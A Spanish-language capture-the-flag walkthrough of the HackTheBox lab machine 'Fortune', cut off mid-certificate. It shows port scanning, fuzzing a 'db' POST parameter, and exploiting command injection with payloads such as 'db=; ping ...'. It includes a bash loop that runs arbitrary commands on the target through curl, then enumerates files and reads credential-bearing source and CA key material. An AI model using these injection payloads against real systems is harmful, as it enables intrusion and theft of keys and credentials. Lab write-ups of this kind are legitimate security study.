---
layout: post
title: Fortune
date: 2023-10-13
description:
img:
fig-caption:
tags: []
---
___

<center><img src="/writeups/assets/img/Fortune-htb/Fortune.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.127 -oG openports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-12 16:01 GMT
Nmap scan report for 10.10.10.127
Host is up (0.056s latency).
Not shown: 65527 closed tcp ports (reset), 5 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 15.59 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
map -sCV -p22,80,443 10.10.10.127 -oN portscan
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-12 16:01 GMT
Nmap scan report for 10.10.10.127
Host is up (0.065s latency).

PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 (RSA)
|   256 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 (ECDSA)
|_  256 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e (ED25519)
80/tcp  open  http       OpenBSD httpd
|_http-title: Fortune
443/tcp open  ssl/https?
| ssl-cert: Subject: commonName=fortune.htb/organizationName=Fortune Co HTB/stateOrProvinceName=ON/countryName=CA
| Not valid before: 2018-10-30T01:13:42
|_Not valid after:  2019-11-09T01:13:42
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.24 seconds
```

Agrego el dominio ```fortune.htb``` al ```/etc/hosts```

## Puerto 80,443 (HTTP, HTTPS)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web. Por SSL no puedo acceder debido a un problema de certificados

```null
whatweb https://10.10.10.127
ERROR Opening: https://10.10.10.127 - SSL_connect returned=1 errno=0 peeraddr=10.10.10.127:443 state=error: sslv3 alert handshake failure
```

Pero puedo inspeccionarlo para ver como está formado

```null
openssl s_client -connect 10.10.10.127:443
CONNECTED(00000003)
Can't use SSL_get_servername
depth=1 C = CA, ST = ON, O = Fortune Co HTB, CN = Fortune Intermediate CA, emailAddress = bob@fortune.htb
verify error:num=20:unable to get local issuer certificate
verify return:1
depth=0 C = CA, ST = ON, O = Fortune Co HTB, CN = fortune.htb, emailAddress = charlie@fortune.htb
verify error:num=10:certificate has expired
notAfter=Nov  9 01:13:42 2019 GMT
verify return:1
depth=0 C = CA, ST = ON, O = Fortune Co HTB, CN = fortune.htb, emailAddress = charlie@fortune.htb
notAfter=Nov  9 01:13:42 2019 GMT
verify return:1
404756C1D47F0000:error:0A000410:SSL routines:ssl3_read_bytes:sslv3 alert handshake failure:../ssl/record/rec_layer_s3.c:1586:SSL alert number 40
---
Certificate chain
 0 s:C = CA, ST = ON, O = Fortune Co HTB, CN = fortune.htb, emailAddress = charlie@fortune.htb
   i:C = CA, ST = ON, O = Fortune Co HTB, CN = Fortune Intermediate CA, emailAddress = bob@fortune.htb
   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
   v:NotBefore: Oct 30 01:13:42 2018 GMT; NotAfter: Nov  9 01:13:42 2019 GMT
 1 s:C = CA, ST = ON, O = Fortune Co HTB, CN = Fortune Intermediate CA, emailAddress = bob@fortune.htb
   i:C = CA, ST = ON, O = Fortune Co HTB, CN = Fortune Root CA, emailAddress = bob@fortune.htb
   a:PKEY: rsaEncryption, 4096 (bit); sigalg: RSA-SHA256
   v:NotBefore: Oct 30 00:56:43 2018 GMT; NotAfter: Oct 27 00:56:43 2028 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIFljCCA36gAwIBAgICEAAwDQYJKoZIhvcNAQELBQAwdTELMAkGA1UEBhMCQ0Ex
CzAJBgNVBAgMAk9OMRcwFQYDVQQKDA5Gb3J0dW5lIENvIEhUQjEgMB4GA1UEAwwX
Rm9ydHVuZSBJbnRlcm1lZGlhdGUgQ0ExHjAcBgkqhkiG9w0BCQEWD2JvYkBmb3J0
dW5lLmh0YjAeFw0xODEwMzAwMTEzNDJaFw0xOTExMDkwMTEzNDJaMG0xCzAJBgNV
BAYTAkNBMQswCQYDVQQIDAJPTjEXMBUGA1UECgwORm9ydHVuZSBDbyBIVEIxFDAS
BgNVBAMMC2ZvcnR1bmUuaHRiMSIwIAYJKoZIhvcNAQkBFhNjaGFybGllQGZvcnR1
bmUuaHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA8Vwx8OBKe9US
vcSdGI/DnTSQ/SR5QLahYx4JkiAcuILUMi5gDhDMouwFBgC+uo9/5ykkzL5u5nmE
5H+jcgulPLlITX0NPNFOwmackoplAMc06r2jhF1sWkPAdPRrKv96lX79n5hbzoT5
aUSqtWXQYEqA/V4jkRWQd6B5W4AmfMv1ARP0Be/vrbfNVpenunQIwBRjj7omQRV2
0mQN42NOPtL43a3AyRKO9T1JM1KiicvR2BZN6+ttTBmwFbgDYbtJhX3XbRG3jCQp
73kU8XSC+Rw9oTg2CEi1l8v+tLtn51GAUnmjUUD11VaHblPiFXLdDakrlBFypUFV
DtKJmcZ7FQIDAQABo4IBNjCCATIwCQYDVR0TBAIwADARBglghkgBhvhCAQEEBAMC
BkAwMwYJYIZIAYb4QgENBCYWJE9wZW5TU0wgR2VuZXJhdGVkIFNlcnZlciBDZXJ0
aWZpY2F0ZTAdBgNVHQ4EFgQUjzVuDQ2qV448DEtvys3R4wDWvwowgZgGA1UdIwSB
kDCBjYAU0FL+Eh0x3w09xhsLfb85LAVtnNShcaRvMG0xCzAJBgNVBAYTAkNBMQsw
CQYDVQQIDAJPTjEXMBUGA1UECgwORm9ydHVuZSBDbyBIVEIxGDAWBgNVBAMMD0Zv
cnR1bmUgUm9vdCBDQTEeMBwGCSqGSIb3DQEJARYPYm9iQGZvcnR1bmUuaHRiggIQ
ADAOBgNVHQ8BAf8EBAMCBaAwEwYDVR0lBAwwCgYIKwYBBQUHAwEwDQYJKoZIhvcN
AQELBQADggIBAJe4bHJZ7GVlmlyOGZ4wb/hPdwgg3eSXctSOYr5O6cseku0gtNne
E0iLxYW4L4/RO48VaFaZAuFfSN+oYTqornygK+ivjHSA6NXrpKP6eClppqTlbFq6
EAOxW/xEpVR73anD718GgtCgmuBUJnjhkKYpB6RqlA+J8QTFYdsSyCIOE9rHCt45
AyfXl9oLv+7rPeCLeu5ZHmwNa1xfvwp+DQ8JF+ZkEErKbR91Xgj9kVJ5sWlvrl7R
gQ7u7mX4eq7FHUAmDaUcWSGJr4wa6++gsUMoDa811eMorkn6i6Rr6S6UzxwmFy7G
byx1DmW2gerp5cnOEsV4kDkmfERuI80sBjwfw5gYThIBEkPttX9EP+LntyRLKbOw
GQHltA3xYt5B4iQggIjoBrAQd1A5T7hjud1VWHPIJc7Mly+YANMGVDC/J5zLXego
qqpVmDGs3jWBo6C31GYrohg0/EdXa3/kyZYTS+zoddNTvpWRxo4mlk3aPe7xkfbR
Z6gaLil2ZLZW7K7eOxiZeZnE3jI1azno8Z1dI5SD14wyKTB8+a1JNPnvymR8Nq3F
AXgj5dy9rjHzMT1sYy+Pd1Kg+gACsTUOS6FjaNGfDAq1MyByOXwRpRg1unSXQu/P
tPCeL+/QSlZKJd1q6XIwyY0ckPRT81BOap7XRXKb9aYDun6U6S7fXaum
-----END CERTIFICATE-----
subject=C = CA, ST = ON, O = Fortune Co HTB, CN = fortune.htb, emailAddress = charlie@fortune.htb
issuer=C = CA, ST = ON, O = Fortune Co HTB, CN = Fortune Intermediate CA, emailAddress = bob@fortune.htb
---
No client certificate CA names sent
Client Certificate Types: RSA sign, ECDSA sign
Requested Signature Algorithms: RSA+SHA512:ECDSA+SHA512:0xEF+0xEF:RSA+SHA384:ECDSA+SHA384:RSA+SHA256:ECDSA+SHA256:0xEE+0xEE:0xED+0xED:RSA+SHA224:ECDSA+SHA224:RSA+SHA1:ECDSA+SHA1
Shared Requested Signature Algorithms: RSA+SHA512:ECDSA+SHA512:RSA+SHA384:ECDSA+SHA384:RSA+SHA256:ECDSA+SHA256:RSA+SHA224:ECDSA+SHA224:RSA+SHA1:ECDSA+SHA1
Peer signing digest: SHA256
Peer signature type: RSA
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 3355 bytes and written 528 bytes
Verification error: certificate has expired
---
New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
    Session-ID: 
    Session-ID-ctx: 
    Master-Key: A0CB50414A02BC878269A5A87A839063C62937798982E5D37091B680D6707C1B340D501496CFD0D207C7FED622FD52F1
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    Start Time: 1697186555
    Timeout   : 7200 (sec)
    Verify return code: 10 (certificate has expired)
    Extended master secret: no
---
```

Se leakean varios usuarios, ```charlie@fortune.htb``` y ```bob@fortune.htb```. En el puerto 80 sí que carga sin problema

```null
whatweb http://10.10.10.127
http://10.10.10.127 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[OpenBSD httpd], IP[10.10.10.127], Title[Fortune], X-UA-Compatible[IE=edge]
```

La página principal se ve así:

<img src="/writeups/assets/img/Fortune-htb/1.png" alt="">

Hago click en cualquiera y al darle a ```submit``` aparece un mensaje, que es dinámico, no depende de a cuál de todos se le haya hecho click, si no que cambia cada vez que se recarga

<img src="/writeups/assets/img/Fortune-htb/2.png" alt="">

Intercepto la petición con ```BurpSuite``` para ver como se tramita

```null
POST /select HTTP/1.1
Host: 10.10.10.127
Content-Length: 8
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.10.127
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.10.127/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

db=zippy
```

Pruebo a hacer inyecciones SQL típicas, pero ninguna da resultados. Aplico fuzzing de caracteres especiales

```null
wfuzz -c -w /usr/share/wordlists/SecLists/Fuzzing/special-chars.txt -d 'db=FUZZ' http://10.10.10.127/select
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.127/select
Total requests: 32

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
=====================================================================

000000001:   200        16 L     25 W       293 Ch      "~"                                                                                                                                            
000000007:   200        16 L     25 W       293 Ch      "^"                                                                                                                                            
000000003:   200        16 L     25 W       293 Ch      "@"                                                                                                                                            
000000014:   200        18 L     41 W       379 Ch      "+"                                                                                                                                            
000000029:   200        16 L     25 W       293 Ch      "'"                                                                                                                                            
000000015:   200        16 L     25 W       293 Ch      "="                                                                                                                                            
000000031:   200        16 L     25 W       293 Ch      "<"                                                                                                                                            
000000032:   200        16 L     25 W       293 Ch      ">"                                                                                                                                            
000000028:   200        16 L     25 W       293 Ch      ":"                                                                                                                                            
000000030:   200        16 L     25 W       293 Ch      """                                                                                                                                            
000000027:   200        19 L     43 W       412 Ch      ";"                                                                                                                                            
000000026:   200        16 L     25 W       293 Ch      "?"                                                                                                                                            
000000025:   200        16 L     25 W       293 Ch      "/"                                                                                                                                            
000000024:   200        16 L     25 W       293 Ch      "."                                                                                                                                            
000000023:   200        16 L     25 W       293 Ch      ","                                                                                                                                            
000000021:   200        26 L     40 W       409 Ch      "\"                                                                                                                                            
000000022:   200        16 L     25 W       293 Ch      "`"                                                                                                                                            
000000020:   200        16 L     25 W       293 Ch      "|"                                                                                                                                            
000000018:   200        16 L     25 W       293 Ch      "]"                                                                                                                                            
000000019:   200        16 L     25 W       293 Ch      "["                                                                                                                                            
000000017:   200        16 L     25 W       293 Ch      "}"                                                                                                                                            
000000016:   200        16 L     25 W       293 Ch      "{"                                                                                                                                            
000000006:   200        16 L     25 W       293 Ch      "%"                                                                                                                                            
000000012:   200        16 L     25 W       293 Ch      "-"                                                                                                                                            
000000008:   200        18 L     41 W       377 Ch      "&"                                                                                                                                            
000000013:   200        16 L     25 W       293 Ch      "_"                                                                                                                                            
000000011:   200        16 L     25 W       293 Ch      ")"                                                                                                                                            
000000010:   200        16 L     25 W       293 Ch      "("                                                                                                                                            
000000009:   200        16 L     25 W       293 Ch      "*"                                                                                                                                            
000000002:   200        16 L     25 W       293 Ch      "!"                                                                                                                                            
000000004:   200        18 L     34 W       375 Ch      "#"                                                                                                                                            
000000005:   200        16 L     25 W       293 Ch      "$"                                                                                                                                            

Total time: 0
Processed Requests: 32
Filtered Requests: 0
Requests/sec.: 0
```

Filtro por aquellas peticiones que tienen 16 líneas. Los resultados que quedan son típicos de ```command inyection```

```null
wfuzz -c --hl=16 -w /usr/share/wordlists/SecLists/Fuzzing/special-chars.txt -d 'db=FUZZ' http://10.10.10.127/select
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.127/select
Total requests: 32

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000027:   200        19 L     44 W       415 Ch      ";"                                                                                                                                             
000000021:   200        24 L     99 W       801 Ch      "\"                                                                                                                                             
000000014:   200        18 L     40 W       370 Ch      "+"                                                                                                                                             
000000008:   200        17 L     29 W       323 Ch      "&"                                                                                                                                             
000000004:   200        20 L     57 W       473 Ch      "#"                                                                                                                                             

Total time: 0
Processed Requests: 32
Filtered Requests: 27
Requests/sec.: 0
```

Pruebo a enviarme una traza ICMP

```null
db=; ping -c 1 10.10.16.5;
```

La recibo en ```tcpdump```

```null
tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
09:02:21.092246 IP fortune.htb > 10.10.16.5: ICMP echo request, id 3306, seq 0, length 64
09:02:21.092267 IP 10.10.16.5 > fortune.htb: ICMP echo reply, id 3306, seq 0, length 64
```

Sin embargo, hay reglas de Firewall implementadas que impiden enviarse una reverse shell. Creo un script de ```bash``` que me permita interactuar más fácilmente, pero sin ser una TTY

```bash
#!/bin/bash

while true; do
  echo -n "[+] Introduce un comando: "
  read command
  curl -s -X POST http://10.10.10.127/select -d "db=; echo marktogrep; $command 2>%261;" | awk '/marktogrep/,/<\/pre>/' | grep -vE "marktogrep|</pre><p>" | sed "s/&#39;/'/g" | sed 's/&#34;/"/g'
  done
```

```null
rlwrap ./cmd.sh
[+] Introduce un comando: whoami
_fortune


[+] Introduce un comando: id
uid=512(_fortune) gid=512(_fortune) groups=512(_fortune)
```

Estoy en el directorio

```null
[+] Introduce un comando: pwd
/var/appsrv/fortune
```

Listo que hay en el anterior

```null
[+] Introduce un comando: ls -la ..
total 20
drwxr-xr-x   5 root       wheel     512 Nov  2  2018 .
drwxr-xr-x  24 root       wheel     512 Nov  2  2018 ..
drwxr-xr-x   4 _fortune   _fortune  512 Oct 13 05:40 fortune
drwxr-x---   4 _pgadmin4  wheel     512 Nov  3  2018 pgadmin4
drwxr-xr-x   4 _sshauth   _sshauth  512 Feb  3  2019 sshauth
```

Con ```find``` veo los permisos de todos los archivos de forma recursiva

```null
[+] Introduce un comando: find ../ -ls
 52122    4 drwxr-xr-x    5 root     wheel         512 Nov  2  2018 ../
 52273    4 drwxr-x---    4 _pgadmin4 wheel         512 Nov  3  2018 ../pgadmin4
find: ../pgadmin4: Permission denied
 52274    4 drwxr-xr-x    4 _fortune _fortune      512 Oct 13 05:40 ../fortune
 52279    4 -rw-r--r--    1 root     _fortune      413 Nov  2  2018 ../fortune/fortuned.py
 52278    4 drwxr-xr-x    2 root     _fortune      512 Nov  2  2018 ../fortune/templates
 53289    4 -rw-r--r--    1 root     _fortune      339 Nov  2  2018 ../fortune/templates/display.html
 54174    4 -rw-r--r--    1 root     _fortune      341 Nov  2  2018 ../fortune/fortuned.ini
 54177    4 -rw-r--r--    1 root     _fortune       67 Nov  2  2018 ../fortune/wsgi.py
 53285    4 drwxrwxrwx    2 _fortune _fortune      512 Nov  2  2018 ../fortune/__pycache__
 54170    4 -rw-r--r--    1 _fortune _fortune      610 Nov  2  2018 ../fortune/__pycache__/fortuned.cpython-36.pyc
 52300  108 -rw-r-----    1 _fortune _fortune    54506 Oct 13 05:48 ../fortune/fortuned.log
 52268    4 -rw-rw-rw-    1 _fortune _fortune        6 Oct 13 04:33 ../fortune/fortuned.pid
 52120    4 -rw-rw-rw-    1 _fortune _fortune       24 Oct 13 05:39 ../fortune/%1
 52283    4 drwxr-xr-x    4 _sshauth _sshauth      512 Feb  3  2019 ../sshauth
 52286    4 -r--------    1 _sshauth _sshauth       61 Nov  2  2018 ../sshauth/.pgpass
 52287    4 -rw-r--r--    1 _sshauth _sshauth     1799 Nov  2  2018 ../sshauth/sshauthd.py
 52288    4 -rw-r--r--    1 _sshauth _sshauth       67 Nov  2  2018 ../sshauth/wsgi.py
 52280    4 drwxr-xr-x    2 _sshauth _sshauth      512 Nov  2  2018 ../sshauth/templates
 52290    4 -rw-r--r--    1 _sshauth _sshauth      841 Nov  2  2018 ../sshauth/templates/display.html
 52282    4 -rw-r--r--    1 _sshauth _sshauth      304 Nov  2  2018 ../sshauth/templates/error.html
 53283    4 -rw-r--r--    1 _sshauth _sshauth      341 Nov  2  2018 ../sshauth/sshauthd.ini
 54180    4 drwxrwxrwx    2 _sshauth _sshauth      512 Nov  2  2018 ../sshauth/__pycache__
 54181    4 -rw-r--r--    1 _sshauth _sshauth     1628 Nov  2  2018 ../sshauth/__pycache__/sshauthd.cpython-36.pyc
 54178   28 -rw-r-----    1 _sshauth _sshauth    13374 Oct 13 04:33 ../sshauth/sshauthd.log
 52281    4 -rw-rw-rw-    1 _sshauth _sshauth        6 Oct 13 04:33 ../sshauth/sshauthd.pid
```

En el archivo ```sshauthd.py``` se encuentran credenciales de acceso a la base de datos

```null
[+] Introduce un comando: cat ../sshauth/sshauthd.py
from flask import Flask, request, render_template
import psycopg2

app = Flask(__name__)

def db_write(key_str):
  result = True
  params = [ request.remote_addr, key_str, key_str ]
  sql_insert = "INSERT INTO authorized_keys (uid, creator, key) VALUES ('nfsuser', %s, %s) ON CONFLICT ON CONSTRAINT authorized_keys_pkey DO UPDATE SET key=%s;"
  try:
    conn = psycopg2.connect("host=localhost dbname=authpf user=appsrv")
    curs = conn.cursor()
    curs.execute(sql_insert, params)
  except:
    result = False

  conn.commit()
  curs.close()
  conn.close()

  return result

@app.route('/generate', methods=['GET'])
def sshauthd():

  # SSH key generation code courtesy of:
  # https://msftstack.wordpress.com/2016/10/15/generating-rsa-keys-with-python-3/
  #
  from cryptography.hazmat.primitives import serialization
  from cryptography.hazmat.primitives.asymmetric import rsa
  from cryptography.hazmat.backends import default_backend

  # generate private/public key pair
  key = rsa.generate_private_key(backend=default_backend(), public_exponent=65537, \
    key_size=2048)

  # get public key in OpenSSH format
  public_key = key.public_key().public_bytes(serialization.Encoding.OpenSSH, \
    serialization.PublicFormat.OpenSSH)

  # get private key in PEM container format
  pem = key.private_bytes(encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.TraditionalOpenSSL,
    encryption_algorithm=serialization.NoEncryption())

  # decode to printable strings
  private_key_str = pem.decode('utf-8')
  public_key_str = public_key.decode('utf-8')

  db_response = db_write(public_key_str)

  if db_response == False:
    return render_template('error.html')
  else:
    return render_template('display.html', private_key=private_key_str, public_key=public_key_str)
```

Busco por el nombre de la base de datos, [authpf](https://www.openbsd.org/faq/pf/authpf.html) en Google. Se utiliza para modificar unas reglas de Firewall

<img src="/writeups/assets/img/Fortune-htb/3.png" alt="">

Siguiendo el manual, para listar esta configuración, hay que dirigirse a la ruta ```/etc/authpf/authpf.rules```

<img src="/writeups/assets/img/Fortune-htb/4.png" alt="">

```null
[+] Introduce un comando: cat /etc/authpf/authpf.rules
ext_if = "em0"
pass in quick on $ext_if inet proto { tcp udp } from $user_ip to ($ext_if) keep state
```

Para que esto se aplique, la conexión se debe realizar a través del protocolo SSH. Liso los usuarios que se han creado en el sistema

```null
[+] Introduce un comando: cat /etc/passwd | grep sh$
root:*:0:0:Charlie &amp;:/root:/bin/ksh
build:*:21:21:base and xenocara build:/var/empty:/bin/ksh
_postgresql:*:503:503:PostgreSQL Manager:/var/postgresql:/bin/sh
_pgadmin4:*:511:511::/usr/local/pgadmin4:/usr/local/bin/bash
charlie:*:1000:1000:Charlie:/home/charlie:/bin/ksh
bob:*:1001:1001::/home/bob:/bin/ksh
```

De la misma forma que antes, listo todos los archivos de ```/home``` con el comando ```find```

```null
[+] Introduce un comando: find . /home -ls
 52274    4 drwxr-xr-x    4 _fortune _fortune      512 Oct 13 05:40 .
 52279    4 -rw-r--r--    1 root     _fortune      413 Nov  2  2018 ./fortuned.py
 52278    4 drwxr-xr-x    2 root     _fortune      512 Nov  2  2018 ./templates
 53289    4 -rw-r--r--    1 root     _fortune      339 Nov  2  2018 ./templates/display.html
 54174    4 -rw-r--r--    1 root     _fortune      341 Nov  2  2018 ./fortuned.ini
 54177    4 -rw-r--r--    1 root     _fortune       67 Nov  2  2018 ./wsgi.py
 53285    4 drwxrwxrwx    2 _fortune _fortune      512 Nov  2  2018 ./__pycache__
 54170    4 -rw-r--r--    1 _fortune _fortune      610 Nov  2  2018 ./__pycache__/fortuned.cpython-36.pyc
 52300  112 -rw-r-----    1 _fortune _fortune    55735 Oct 13 06:04 ./fortuned.log
 52268    4 -rw-rw-rw-    1 _fortune _fortune        6 Oct 13 04:33 ./fortuned.pid
 52120    4 -rw-rw-rw-    1 _fortune _fortune       24 Oct 13 05:39 ./%1
     2    4 drwxr-xr-x    5 root     wheel         512 Nov  2  2018 /home
 27648    4 drwxr-x---    3 charlie  charlie       512 Nov  5  2018 /home/charlie
find: /home/charlie: Permission denied
 41472    4 drwxr-xr-x    5 bob      bob           512 Nov  3  2018 /home/bob
 41473    4 drwx------    2 bob      bob           512 Nov  2  2018 /home/bob/.ssh
find: /home/bob/.ssh: Permission denied
 41475    4 -rw-r--r--    1 bob      bob            87 Oct 11  2018 /home/bob/.Xdefaults
 41476    4 -rw-r--r--    1 bob      bob           771 Oct 11  2018 /home/bob/.cshrc
 41477    4 -rw-r--r--    1 bob      bob           101 Oct 11  2018 /home/bob/.cvsrc
 41478    4 -rw-r--r--    1 bob      bob           359 Oct 11  2018 /home/bob/.login
 41479    4 -rw-r--r--    1 bob      bob           175 Oct 11  2018 /home/bob/.mailrc
 41480    4 -rw-r--r--    1 bob      bob           215 Oct 11  2018 /home/bob/.profile
 41481    4 drwxr-xr-x    7 bob      bob           512 Oct 29  2018 /home/bob/ca
 41482    4 drwxr-xr-x    2 bob      bob           512 Oct 29  2018 /home/bob/ca/certs
 41483    8 -r--r--r--    1 bob      bob          2053 Oct 29  2018 /home/bob/ca/certs/ca.cert.pem
 41484    4 drwxr-xr-x    2 bob      bob           512 Oct 29  2018 /home/bob/ca/crl
 41485    4 drwxr-xr-x    2 bob      bob           512 Oct 29  2018 /home/bob/ca/newcerts
 41486    8 -rw-r--r--    1 bob      bob          2061 Oct 29  2018 /home/bob/ca/newcerts/1000.pem
 41487    4 drwx------    2 bob      bob           512 Oct 29  2018 /home/bob/ca/private
find: /home/bob/ca/private: Permission denied
 41489    4 -rw-r--r--    1 bob      bob           115 Oct 29  2018 /home/bob/ca/index.txt
 41490    4 -rw-r--r--    1 bob      bob             5 Oct 29  2018 /home/bob/ca/serial
 41491   12 -rw-r--r--    1 bob      bob          4200 Oct 29  2018 /home/bob/ca/openssl.cnf
 41492    4 drwxr-xr-x    7 bob      bob           512 Nov  3  2018 /home/bob/ca/intermediate
 41493    4 drwxr-xr-x    2 bob      bob           512 Nov  3  2018 /home/bob/ca/intermediate/certs
 41494    8 -r--r--r--    1 bob      bob          2061 Oct 29  2018 /home/bob/ca/intermediate/certs/intermediate.cert.pem
 41495   12 -r--r--r--    1 bob      bob          4114 Oct 29  2018 /home/bob/ca/intermediate/certs/ca-chain.cert.pem
 41496    4 -r--r--r--    1 bob      bob          1996 Oct 29  2018 /home/bob/ca/intermediate/certs/fortune.htb.cert.pem
 41498    4 drwxr-xr-x    2 bob      bob           512 Oct 29  2018 /home/bob/ca/intermediate/crl
 41499    4 drwxr-xr-x    2 bob      bob           512 Oct 29  2018 /home/bob/ca/intermediate/csr
 41500    4 -rw-r--r--    1 bob      bob          1716 Oct 29  2018 /home/bob/ca/intermediate/csr/intermediate.csr.pem
 41501    4 -rw-r--r--    1 bob      bob          1013 Oct 29  2018 /home/bob/ca/intermediate/csr/fortune.htb.csr.pem
 41503    4 drwxr-xr-x    2 bob      bob           512 Oct 29  2018 /home/bob/ca/intermediate/newcerts
 41504    4 -rw-r--r--    1 bob      bob          1996 Oct 29  2018 /home/bob/ca/intermediate/newcerts/1000.pem
 41506    4 drwxr-xr-x    2 bob      bob           512 Oct 29  2018 /home/bob/ca/intermediate/private
 41507    8 -rw-r--r--    1 bob      bob          3243 Oct 29  2018 /home/bob/ca/intermediate/private/intermediate.key.pem
 41508    4 -r--------    1 bob      bob          1675 Oct 29  2018 /home/bob/ca/intermediate/private/fortune.htb.key.pem
 41510    4 -rw-r--r--    1 bob      bob           107 Oct 29  2018 /home/bob/ca/intermediate/index.txt
 41511    4 -rw-r--r--    1 bob      bob             5 Oct 29  2018 /home/bob/ca/intermediate/serial
 41512    4 -rw-r--r--    1 bob      bob             5 Oct 29  2018 /home/bob/ca/intermediate/crlnumber
 41513   12 -rw-r--r--    1 bob      bob          4328 Oct 29  2018 /home/bob/ca/intermediate/openssl.cnf
 41514    4 -rw-r--r--    1 bob      bob            21 Oct 29  2018 /home/bob/ca/intermediate/index.txt.attr
 41516    4 -rw-r--r--    1 bob      bob             5 Oct 29  2018 /home/bob/ca/intermediate/serial.old
 41518    4 -rw-r--r--    1 bob      bob            21 Oct 29  2018 /home/bob/ca/index.txt.attr
 41519    4 -rw-r--r--    1 bob      bob             5 Oct 29  2018 /home/bob/ca/serial.old
 41520    0 -rw-r--r--    1 bob      bob             0 Oct 29  2018 /home/bob/ca/index.txt.old
 41521    4 drwxr-xr-x    2 bob      bob           512 Nov  2  2018 /home/bob/dba
 41522    4 -rw-r--r--    1 bob      bob           195 Nov  2  2018 /home/bob/dba/authpf.sql
 41497    4 -rw-------    1 bob      bob            13 Nov  3  2018 /home/bob/.psql_history
 13824    4 drwxr-xr-x    2 nfsuser  nfsuser       512 Nov  2  2018 /home/nfsuser
 13827    4 -rw-r--r--    1 nfsuser  nfsuser        87 Oct 11  2018 /home/nfsuser/.Xdefaults
 13828    4 -rw-r--r--    1 nfsuser  nfsuser       771 Oct 11  2018 /home/nfsuser/.cshrc
 13829    4 -rw-r--r--    1 nfsuser  nfsuser       101 Oct 11  2018 /home/nfsuser/.cvsrc
 13830    4 -rw-r--r--    1 nfsuser  nfsuser       359 Oct 11  2018 /home/nfsuser/.login
 13831    4 -rw-r--r--    1 nfsuser  nfsuser       175 Oct 11  2018 /home/nfsuser/.mailrc
 13832    4 -rw-r--r--    1 nfsuser  nfsuser       215 Oct 11  2018 /home/nfsuser/.profile
```

Dentro de ```/home/bob/ca/``` se encuentran las claves para los certificados. Me transfiero a mi equipo los archivos necesarios para crear un PFX y poder acceder al puerto 443

```null
[+] Introduce un comando: cat /home/bob/ca/intermediate/certs/intermediate.cert.pem
-----BEGIN CERTIFICATE-----
MIIFxDCCA6ygAwIBAgICEAAwDQYJKoZIhvcNAQELBQAwbTELMAkGA1UEBhMCQ0Ex
CzAJBgNVBAgMAk9OMRcwFQYDVQQKDA5Gb3J0dW5lIENvIEhUQjEYMBYGA1UEAwwP
Rm9ydHVuZSBSb290IENBMR4wHAYJKoZIhvcNAQkBFg9ib2JAZm9ydHVuZS5odGIw
HhcNMTgxMDMwMDA1NjQzWhcNMjgxMDI3MDA1NjQzWjB1MQswCQYDVQQGEwJDQTEL
MAkGA1UECAwCT04xFzAVBgNVBAoMDkZvcnR1bmUgQ28gSFRCMSAwHgYDVQQDDBdG
b3J0dW5lIEludGVybWVkaWF0ZSBDQTEeMBwGCSqGSIb3DQEJARYPYm9iQGZvcnR1
bmUuaHRiMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAuTGpzUbl4RIy
DuJv8S36vZm96P8FoUgseznDqNOqAEN+qU6NTzZAjOvCAJu7tiJjnvrUxf4SzuLR
QEsU99R6UDBj/rz1dMRq3P/7VdbNC5o2zrd99fN/MDz288Rv7Z24LKWvPoEFWU5D
SpQo+lregWcl4yzTS0hHQjjk/aGPPkLFhT1oW/kbz9205JT1LvR+mqNWbH/0Q92K
7Ns3b2UqEdvD0nm/t7SAphhkGYEtsxyEdiI97sB6jXxlgHzblwFlQaHvh6H7u6rC
m/VGQDFmY3d/zA1TtZ0vuAJ2/EEs0NU6XySL6YmfIsPJdu4NoeEeXofqwQjNf2bs
jgQZrOujLxTBo1L4cFsNvZVwwNscyr+wZM/SybEGB3vBe4e+wvzkT7YD4lqubvXZ
